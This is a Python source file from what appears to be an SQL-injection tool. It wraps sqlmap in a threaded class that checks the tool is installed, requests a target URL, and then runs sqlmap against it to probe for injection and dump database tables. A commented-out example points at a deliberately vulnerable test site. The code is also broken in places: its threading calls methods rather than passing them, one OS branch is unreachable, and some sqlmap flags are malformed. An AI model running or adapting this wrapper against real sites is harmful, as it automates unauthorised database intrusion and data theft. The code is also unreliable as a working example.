import sys
import os
current_directory = os.getcwd()
sys.path.append(current_directory)


from threading import Thread
from logger.logs import logger
from Exceptions.exceptions import SQLJNGFatalError
from lib.mysqlerrorbased.OPS.OSY import Operatingsystem
from lib.mysqlerrorbased.OPS.Platforms import Platforms
from Exceptions.exceptions import SQLJNGFatalError
from lib.priority.Priority import PRIORITY
from lib.priority.Priority import HARMFULL
from Exceptions.exceptions import SQLJNGOSError
import subprocess
from dataclasses import dataclass
import threading
import requests
from logger.sqljlog import logger as sqljlog
from Exceptions.sqljngwarnings import SQLJMapNotRunningInMacos
import warnings
import platform

#Reference :https://stackoverflow.com/questions/32382793/inheritance-threading-thread-class-does-not-work

@dataclass
class SQLmap(Thread):
    _url : str
    _username : bool
    _password : bool
    _dump : bool
    _columns : bool
    _tables : bool
    _auto : bool
    _os = Operatingsystem()
    _platform = Platforms()

    def _Check_SQlmap(self):
        try:
            if self._os != self._platform.LINUX:
                raise SQLJNGOSError
            
            elif self._os == self._platform.MAC.lower() or platform.system().lower() == "darwin":
                warnings.warn("mac os cannot run sqlmap properly",SQLJMapNotRunningInMacos)
            
            elif self._os == self._platform.LINUX:
                cmd = subprocess.check_output(["sqlmap","--version"])
                msg = "sqlmap version:"
                msg += str(cmd.decode('utf-8') if type(cmd) != int else "")
                logger.info(msg)
                return True

        
        except (subprocess.CalledProcessError,subprocess.SubprocessError) as exc:
            logger.error(exc)
            return False


        except SQLJNGOSError:
            logger.critical("Sqlmap cannot be executed in your system.")
            return False
        
        except KeyboardInterrupt:
            logger.info("Aborted")
            return False
        
    
    def exploit(self):
        if self._Check_SQlmap():
            try:
                #Reference:https://stackoverflow.com/questions/89228/how-do-i-execute-a-program-or-call-a-system-command
                cmd = subprocess.Popen(["sqlmap","-u",str(self._url)])
                cmd.wait()
                print(cmd)
                if self._tables:
                    cmd = subprocess.Popen(["sqlmap","-u",str(self._url),"-T"])
                    cmd.wait()
                    print(cmd)
                
                elif self._auto:
                    cmd = subprocess.Popen(["sqlmap","-u",str(self._url),"--_dump"])
                    cmd.wait()
                    print(cmd)

                    
            
            except (subprocess.CalledProcessError,subprocess.SubprocessError) as err:
                logger.error(err)
            
            except KeyboardInterrupt:
                logger.info("Aborted")
            
        else:
            logger.critical("Your system cannot execute sqlmap")

    def Dump_the_tables(self):
        if self._Check_SQlmap() and self._dump is True:
            cmd =subprocess.Popen(["sqlmap","-u",str(self._url)])
            cmd.wait()

    
    def execute_all(self):
        threads  = [
            self.Dump_the_tables(),
            self.exploit()
        ]
        for thread in threads:
            var = Thread(thread)
            var.start()
            var.join()

    @property
    def _normal_attack_checking_url_host(self):
        self._Check_SQlmap()
        try:
            _response = requests.get(self._url)
            assert _response.status_code == 200,"Host is not valid"
            return True
        
        except AssertionError as ex:
            sqljlog.error(ex)
            return False
        
    def main_attack(self):
        if self._normal_attack_checking_url_host:
            self.execute_all()
        
    
        
    
                
            
    
    def run(self):
        pass



# obj = SQLmap("http://testphp.vulnweb.com/artists.php?id=1",False,False,True,False,False,False)
# obj.main_attack()

